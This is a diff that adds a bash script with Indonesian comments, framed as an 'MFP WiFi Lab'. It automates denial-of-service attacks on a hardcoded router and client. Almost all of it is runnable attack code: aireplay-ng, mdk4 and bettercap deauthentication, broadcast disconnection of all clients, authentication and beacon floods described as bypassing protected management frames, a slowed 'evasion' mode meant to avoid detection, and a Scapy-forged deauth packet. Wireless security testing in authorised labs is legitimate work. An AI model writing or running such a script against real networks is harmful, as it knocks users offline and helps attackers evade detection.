@@ -1,0 +1,590 @@
+#!/bin/bash
+# ==============================================================================
+# MFP WiFi Lab - Master Script (Gabungan Semua Langkah)
+# ==============================================================================
+# BSSID Router (Target AP): 14:8C:4A:B4:F4:8C
+# MAC Client (HP Anda):     20:3B:69:CE:88:3D
+# Interface Monitor:        wlan0mon
+# ==============================================================================
+
+set -u
+
+BSSID="14:8C:4A:B4:F4:8C"
+CLIENT="20:3B:69:CE:88:3D"
+IFACE="wlan0mon"
+MANAGED_IFACE="wlan0"
+
+# Warna output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+# Variabel global untuk channel (deteksi sekali saja di awal)
+DETECTED_CHANNEL=""
+
+# ---------------------------------------------------------------
+# Fungsi: cek apakah dijalankan sebagai root
+# ---------------------------------------------------------------
+cek_root() {
+    if [ "$EUID" -ne 0 ]; then
+        echo -e "${RED}[!] Harap jalankan skrip ini dengan sudo: sudo $0${NC}"
+        exit 1
+    fi
+}
+
+# ---------------------------------------------------------------
+# Fungsi: cek apakah interface monitor tersedia
+# ---------------------------------------------------------------
+cek_interface() {
+    if ! ip link show "$IFACE" >/dev/null 2>&1; then
+        echo -e "${RED}[!] Interface $IFACE tidak ditemukan.${NC}"
+        echo -e "${YELLOW}    Aktifkan monitor mode terlebih dahulu:${NC}"
+        echo -e "    sudo airmon-ng start wlan0"
+        exit 1
+    fi
+    echo -e "${GREEN}[+] Interface $IFACE tersedia.${NC}"
+}
+
+# ---------------------------------------------------------------
+# Fungsi: cek ketersediaan alat utama
+# ---------------------------------------------------------------
+cek_tool() {
+    for tool in aireplay-ng mdk4 bettercap iw tshark python3; do
+        if ! command -v "$tool" >/dev/null 2>&1; then
+            echo -e "${YELLOW}[-] Peringatan: '$tool' tidak terinstal.${NC}"
+        fi
+    done
+    if ! python3 -c "import scapy.all" >/dev/null 2>&1; then
+        echo -e "${YELLOW}[-] Peringatan: Python scapy tidak terinstal. Langkah Scapy tidak akan berjalan.${NC}"
+    fi
+    echo -e "${BLUE}[i] Jika banyak alat belum terpasang: sudo ./install-requirements.sh${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# Fungsi: deteksi channel otomatis dari BSSID target
+# Hanya mengeluarkan angka channel ke stdout (untuk ditangkap variabel).
+# Semua status ditulis ke stderr.
+# ---------------------------------------------------------------
+deteksi_channel() {
+    local channel=""
+    local scan_iface=""
+
+    # Pilih interface scan: managed dulu, baru monitor
+    if ip link show "$MANAGED_IFACE" >/dev/null 2>&1; then
+        scan_iface="$MANAGED_IFACE"
+    elif ip link show "$IFACE" >/dev/null 2>&1; then
+        scan_iface="$IFACE"
+    else
+        echo -e "${YELLOW}[!] Tidak ada interface wireless untuk scan channel.${NC}" >&2
+        return 1
+    fi
+
+    echo -e "${BLUE}[i] Mencari channel BSSID $BSSID via $scan_iface...${NC}" >&2
+
+    # Metode 1: iw scan (DS Parameter set channel)
+    channel=$(sudo iw dev "$scan_iface" scan 2>/dev/null | \
+        awk -v bssid="$BSSID" '
+            BEGIN { found=0 }
+            /^BSS / { found=0 }
+            /^BSS / {
+                if (match($0, /BSS ([0-9a-fA-F:]+)/, arr)) {
+                    if (tolower(arr[1]) == tolower(bssid)) found=1
+                }
+            }
+            found && /DS Parameter set: channel/ {
+                if (match($0, /channel ([0-9]+)/, arr)) {
+                    print arr[1]
+                    exit
+                }
+            }
+        ' 2>/dev/null || true)
+
+    # Metode 2: iw scan (freq -> channel)
+    if [ -z "$channel" ]; then
+        channel=$(sudo iw dev "$scan_iface" scan 2>/dev/null | \
+            awk -v bssid="$BSSID" '
+                BEGIN { found=0 }
+                /^BSS / { found=0 }
+                /^BSS / {
+                    if (match($0, /BSS ([0-9a-fA-F:]+)/, arr)) {
+                        if (tolower(arr[1]) == tolower(bssid)) found=1
+                    }
+                }
+                found && /freq:/ {
+                    if (match($0, /freq: ([0-9]+)/, arr)) {
+                        freq=arr[1]+0
+                        if (freq >= 2412 && freq <= 2484) {
+                            if (freq == 2484) print 14
+                            else print int((freq - 2412) / 5) + 1
+                            exit
+                        }
+                        else if (freq >= 5170 && freq <= 5825) {
+                            print int((freq - 5170) / 5) + 34
+                            exit
+                        }
+                    }
+                }
+            ' 2>/dev/null || true)
+    fi
+
+    # Metode 3: iwlist scan (fallback)
+    if [ -z "$channel" ] && command -v iwlist >/dev/null 2>&1; then
+        channel=$(sudo iwlist "$scan_iface" scan 2>/dev/null | \
+            awk -v bssid="$BSSID" '
+                BEGIN { found=0 }
+                /Address: / { found=0 }
+                /Address: / {
+                    if (match($0, /Address: ([0-9A-Fa-f:]+)/, arr)) {
+                        if (tolower(arr[1]) == tolower(bssid)) found=1
+                    }
+                }
+                found && /Channel:[0-9]+/ {
+                    if (match($0, /Channel:([0-9]+)/, arr)) {
+                        print arr[1]
+                        exit
+                    }
+                }
+            ' 2>/dev/null || true)
+    fi
+
+    # Validasi: channel harus angka murni 1-165
+    if [ -n "$channel" ] && [[ "$channel" =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 165 ]; then
+        echo -e "${GREEN}[+] Channel ditemukan: $channel${NC}" >&2
+        echo "$channel"
+        return 0
+    fi
+
+    echo -e "${YELLOW}[!] Tidak dapat mendeteksi channel secara otomatis.${NC}" >&2
+    echo -e "${YELLOW}    Pastikan router menyiarakan beacon dan Anda dalam jangkauan.${NC}" >&2
+    return 1
+}
+
+# ---------------------------------------------------------------
+# Fungsi: set channel interface monitor
+# ---------------------------------------------------------------
+set_channel() {
+    local channel="$1"
+
+    if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
+        echo -e "${RED}[!] Channel tidak valid: '$channel'${NC}" >&2
+        return 1
+    fi
+
+    echo -e "${BLUE}[i] Mengatur $IFACE ke channel $channel...${NC}" >&2
+
+    # Metode 1: iw dev set channel
+    if sudo iw dev "$IFACE" set channel "$channel" 2>/dev/null; then
+        sleep 1
+        echo -e "${GREEN}[+] Channel diset ke $channel (via iw)${NC}" >&2
+        return 0
+    fi
+
+    # Metode 2: iwconfig
+    echo -e "${YELLOW}[-] iw gagal, mencoba iwconfig...${NC}" >&2
+    if sudo iwconfig "$IFACE" channel "$channel" 2>/dev/null; then
+        sleep 1
+        echo -e "${GREEN}[+] Channel diset ke $channel (via iwconfig)${NC}" >&2
+        return 0
+    fi
+
+    # Metode 3: reset interface
+    echo -e "${YELLOW}[-] iwconfig gagal, mencoba reset interface...${NC}" >&2
+    sudo ifconfig "$IFACE" down 2>/dev/null
+    sleep 1
+    sudo iwconfig "$IFACE" channel "$channel" 2>/dev/null
+    sudo ifconfig "$IFACE" up 2>/dev/null
+    sleep 1
+
+    if sudo iw dev "$IFACE" info 2>/dev/null | grep -q "channel"; then
+        echo -e "${GREEN}[+] Channel diset ke $channel (via reset)${NC}" >&2
+        return 0
+    fi
+
+    echo -e "${RED}[!] Gagal mengatur channel ke $channel${NC}" >&2
+    return 1
+}
+
+# ---------------------------------------------------------------
+# Fungsi: siapkan channel sekali di awal (pilihan user)
+# ---------------------------------------------------------------
+siapkan_channel_awal() {
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        return 0
+    fi
+
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}PENGATURAN CHANNEL AWAL${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Router $BSSID perlu channel yang tepat agar serangan berhasil."
+    echo ""
+
+    local ch_auto
+    ch_auto=$(deteksi_channel)
+
+    if [ -n "$ch_auto" ] && [[ "$ch_auto" =~ ^[0-9]+$ ]]; then
+        DETECTED_CHANNEL="$ch_auto"
+        set_channel "$DETECTED_CHANNEL"
+        echo ""
+        return 0
+    fi
+
+    echo -e "${YELLOW}[!] Deteksi otomatis gagal.${NC}"
+    read -p "Masukkan channel secara manual (contoh: 11) atau tekan Enter untuk lewati: " ch_manual
+    if [ -n "$ch_manual" ] && [[ "$ch_manual" =~ ^[0-9]+$ ]]; then
+        DETECTED_CHANNEL="$ch_manual"
+        set_channel "$DETECTED_CHANNEL"
+    else
+        echo -e "${YELLOW}[-] Melanjutkan tanpa men-set channel.${NC}"
+        DETECTED_CHANNEL=""
+    fi
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 0: PERSIAPAN
+# ---------------------------------------------------------------
+langkah_persiapan() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 0: PERSIAPAN${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    cek_root
+    cek_interface
+    cek_tool
+    siapkan_channel_awal
+    echo -e "${GREEN}[+] Persiapan selesai.${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 1: DETEKSI MFP (Protected Management Frames)
+# ---------------------------------------------------------------
+langkah_deteksi_mfp() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 1: DETEKSI MFP${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Mengecek apakah router menggunakan MFP (PMF)."
+    echo "Catatan: Ganti 'CorpWiFi' dengan SSID router Anda jika berbeda."
+    echo ""
+
+    local scan_iface="$MANAGED_IFACE"
+    if ! ip link show "$scan_iface" >/dev/null 2>&1; then
+        scan_iface="$IFACE"
+        echo -e "${YELLOW}[!] Interface $MANAGED_IFACE tidak ditemukan, menggunakan $IFACE.${NC}" >&2
+    fi
+
+    echo "Memindai RSN capabilities dengan iw..."
+    sudo iw dev "$scan_iface" scan 2>/dev/null | grep -A 15 "CorpWiFi" | grep -i "pmf|mfp|capabilities" || true
+    echo ""
+
+    echo "Memfilter paket Beacon dengan tshark (5 paket pertama)..."
+    sudo tshark -i "$IFACE" -Y "wlan.fc.type_subtype == 0x08" \
+        -T fields -e wlan.ssid -e wlan.rsn.capabilities.mfpc -e wlan.rsn.capabilities.mfpr \
+        -c 5 2>/dev/null || true
+    echo -e "${GREEN}[+] Deteksi MFP selesai.${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 2: DEAUTH TUNGGAL (Targeted)
+# ---------------------------------------------------------------
+langkah_deauth_tunggal() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 2: DEAUTH TUNGGAL (Targeted)${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Mengirim 10 paket deauth ke client $CLIENT dari AP $BSSID."
+
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        set_channel "$DETECTED_CHANNEL"
+    fi
+
+    sudo aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT" "$IFACE"
+    echo -e "${GREEN}[+] Deauth tunggal selesai.${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 3: DEAUTH BROADCAST (Semua Client)
+# ---------------------------------------------------------------
+langkah_deauth_broadcast() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 3: DEAUTH BROADCAST (Semua Client)${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${YELLOW}[!] PERINGATAN: Ini akan memutus SEMUA klien yang terhubung ke AP $BSSID.${NC}"
+    echo ""
+
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        set_channel "$DETECTED_CHANNEL"
+    fi
+
+    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
+    echo -e "${YELLOW}    Tekan Ctrl+C untuk menghentikan lebih awal.${NC}"
+    echo ""
+    read -p "Lanjutkan? (y/N): " konfirm
+    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
+        timeout 30 sudo aireplay-ng -0 0 -a "$BSSID" "$IFACE" || true
+    else
+        echo -e "${YELLOW}[-] Dilewati.${NC}"
+    fi
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 4: MDK4 DEAUTH
+# ---------------------------------------------------------------
+langkah_mdk4() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 4: MDK4 DEAUTH${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Menulis target BSSID ke file target.txt..."
+    echo "$BSSID" > target.txt
+
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        set_channel "$DETECTED_CHANNEL"
+    fi
+
+    echo "Menjalankan mdk4 deauth + disassociation."
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        echo "Channel: $DETECTED_CHANNEL"
+    else
+        echo -e "${YELLOW}[!] Channel tidak diketahui, mdk4 akan menggunakan default.${NC}"
+    fi
+
+    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
+    echo -e "${YELLOW}    Tekan Ctrl+C untuk menghentikan lebih awal.${NC}"
+    echo ""
+    read -p "Lanjutkan? (y/N): " konfirm
+    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
+        if [ -n "$DETECTED_CHANNEL" ]; then
+            timeout 30 sudo mdk4 "$IFACE" d -b target.txt -c "$DETECTED_CHANNEL" || true
+        else
+            timeout 30 sudo mdk4 "$IFACE" d -b target.txt || true
+        fi
+    else
+        echo -e "${YELLOW}[-] Dilewati.${NC}"
+    fi
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 5: BETTERCAP DEAUTH
+# ---------------------------------------------------------------
+langkah_bettercap() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 5: BETTERCAP DEAUTH${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Menjalankan bettercap secara non-interaktif (recon + deauth ke $BSSID)."
+    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
+    echo ""
+    read -p "Lanjutkan? (y/N): " konfirm
+    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
+        timeout 30 sudo bettercap -iface "$IFACE" -eval "wifi.recon on; wifi.deauth $BSSID" || true
+    else
+        echo -e "${YELLOW}[-] Dilewati.${NC}"
+    fi
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 6: MFP BYPASS
+# ---------------------------------------------------------------
+langkah_mfp_bypass() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 6: MFP BYPASS${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Metode bypass MFP yang digunakan:"
+    echo "  - Auth Flood    : kehabisan slot asosiasi pada AP"
+    echo "  - Beacon Flood  : buat klien bingung memilih jaringan"
+    echo ""
+
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        set_channel "$DETECTED_CHANNEL"
+    fi
+
+    echo -e "${YELLOW}[!] mdk4 akan berjalan selama 30 detik per perintah.${NC}"
+    echo -e "${YELLOW}    Tekan Ctrl+C untuk menghentikan lebih awal.${NC}"
+    read -p "Jalankan Auth Flood? (y/N): " konfirm1
+    if [[ "$konfirm1" =~ ^[Yy]$ ]]; then
+        if [ -n "$DETECTED_CHANNEL" ]; then
+            timeout 30 sudo mdk4 "$IFACE" a -a "$BSSID" || true
+        else
+            timeout 30 sudo mdk4 "$IFACE" a -a "$BSSID" || true
+        fi
+    fi
+    read -p "Jalankan Beacon Flood? (butuh ssid-list.txt) (y/N): " konfirm2
+    if [[ "$konfirm2" =~ ^[Yy]$ ]]; then
+        if [ -f "ssid-list.txt" ]; then
+            if [ -n "$DETECTED_CHANNEL" ]; then
+                timeout 30 sudo mdk4 "$IFACE" b -f ssid-list.txt -c "$DETECTED_CHANNEL" || true
+            else
+                timeout 30 sudo mdk4 "$IFACE" b -f ssid-list.txt || true
+            fi
+        else
+            echo -e "${RED}[!] File ssid-list.txt tidak ditemukan. Buat dulu daftar SSID.${NC}"
+        fi
+    fi
+    echo -e "${GREEN}[+] MFP bypass selesai.${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 7: EVASION SLOW (Rate-Limited)
+# ---------------------------------------------------------------
+langkah_evasion_slow() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 7: EVASION SLOW (Rate-Limited)${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Mengirim deauth 1 paket setiap 30 detik (5 kali), lalu 2 paket tambahan."
+
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        set_channel "$DETECTED_CHANNEL"
+    fi
+
+    for i in $(seq 1 5); do
+        echo -e "${YELLOW}  Burst $i/5${NC}"
+        sudo aireplay-ng -0 1 -a "$BSSID" -c "$CLIENT" "$IFACE"
+        if [ "$i" -lt 5 ]; then
+            sleep 30
+        fi
+    done
+    echo ""
+    echo "Deauth tambahan (2 paket) untuk client bernilai tinggi..."
+    sudo aireplay-ng -0 2 -a "$BSSID" -c "$CLIENT" "$IFACE"
+    echo ""
+
+    echo "mdk4 disassociation rendah intensitas (1 paket/detik)..."
+    echo -e "${YELLOW}[!] Akan berjalan selama 30 detik lalu otomatis berhenti.${NC}"
+    read -p "Lanjutkan mdk4? (y/N): " konfirm
+    if [[ "$konfirm" =~ ^[Yy]$ ]]; then
+        if [ -n "$DETECTED_CHANNEL" ]; then
+            timeout 30 sudo mdk4 "$IFACE" d -b target.txt -s 1 || true
+        else
+            timeout 30 sudo mdk4 "$IFACE" d -b target.txt -s 1 || true
+        fi
+    fi
+    echo -e "${GREEN}[+] Evasion slow selesai.${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# LANGKAH 8: SCAPY DEAUTH (Custom Reason Code)
+# ---------------------------------------------------------------
+langkah_scapy() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}LANGKAH 8: SCAPY DEAUTH (Custom Reason Code)${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "Membuat dan mengirim paket deauth custom (reason code 3 = client leaving)."
+
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        set_channel "$DETECTED_CHANNEL"
+    fi
+
+    python3 << 'EOF'
+from scapy.all import *
+
+import os
+ap_mac = os.environ.get("BSSID", "14:8C:4A:B4:F4:8C")
+client_mac = os.environ.get("CLIENT", "20:3B:69:CE:88:3D")
+iface = os.environ.get("IFACE", "wlan0mon")
+
+pkt = RadioTap() / Dot11(
+    addr1=client_mac,
+    addr2=ap_mac,
+    addr3=ap_mac
+) / Dot11Deauth(reason=3)
+
+sendp(pkt, iface=iface, count=3, inter=0.5)
+EOF
+    echo -e "${GREEN}[+] Scapy deauth selesai.${NC}"
+    echo ""
+}
+
+# ---------------------------------------------------------------
+# TAMPILAN MENU
+# ---------------------------------------------------------------
+tampilkan_menu() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}   MFP WiFi Lab - Master Script${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo "BSSID Router : $BSSID"
+    echo "Client HP    : $CLIENT"
+    echo "Interface    : $IFACE"
+    if [ -n "$DETECTED_CHANNEL" ]; then
+        echo "Channel      : $DETECTED_CHANNEL"
+    else
+        echo "Channel      : (belum diset)"
+    fi
+    echo ""
+    echo "Pilih langkah:"
+    echo "  0. Persiapan & Cek (root, interface, tools, channel)"
+    echo "  1. Deteksi MFP"
+    echo "  2. Deauth Tunggal (Targeted)"
+    echo "  3. Deauth Broadcast (Semua Client)"
+    echo "  4. MDK4 Deauth"
+    echo "  5. Bettercap Deauth"
+    echo "  6. MFP Bypass"
+    echo "  7. Evasion Slow (Rate-Limited)"
+    echo "  8. Scapy Deauth (Custom Reason Code)"
+    echo "  9. Jalankan Semua (Urut)"
+    echo "  q. Keluar"
+    echo ""
+    read -p "Pilihan: " pilihan
+}
+
+# ---------------------------------------------------------------
+# JALANKAN SEMUA (URUT) - dengan timeout otomatis
+# ---------------------------------------------------------------
+jalankan_semua() {
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}   Menjalankan Semua Langkah (Urut)${NC}"
+    echo -e "${BLUE}========================================${NC}"
+    echo ""
+
+    export BSSID CLIENT IFACE
+
+    langkah_persiapan
+    langkah_deteksi_mfp
+    langkah_deauth_tunggal
+
+    echo -e "${YELLOW}[!] Langkah 3 (Broadcast Deauth) - 30 detik${NC}"
+    langkah_deauth_broadcast
+
+    echo -e "${YELLOW}[!] Langkah 4 (MDK4 Deauth) - 30 detik${NC}"
+    langkah_mdk4
+
+    echo -e "${YELLOW}[!] Langkah 5 (Bettercap Deauth) - 30 detik${NC}"
+    langkah_bettercap
+
+    langkah_mfp_bypass
+    langkah_evasion_slow
+    langkah_scapy
+
+    echo -e "${GREEN}========================================${NC}"
+    echo -e "${GREEN}   Semua langkah telah diproses.${NC}"
+    echo -e "${GREEN}========================================${NC}"
+}
+
+# ---------------------------------------------------------------
+# MAIN LOOP
+# ---------------------------------------------------------------
+while true; do
+    tampilkan_menu
+    case $pilihan in
+        0) langkah_persiapan ;;
+        1) langkah_deteksi_mfp ;;
+        2) langkah_deauth_tunggal ;;
+        3) langkah_deauth_broadcast ;;
+        4) langkah_mdk4 ;;
+        5) langkah_bettercap ;;
+        6) langkah_mfp_bypass ;;
+        7) langkah_evasion_slow ;;
+        8) langkah_scapy ;;
+        9) jalankan_semua ;;
+        q|Q) echo "Keluar."; break ;;
+        *) echo -e "${RED}Pilihan tidak valid.${NC}" ;;
+    esac
+    echo ""
+    read -p "Tekan Enter untuk kembali ke menu..."
+done
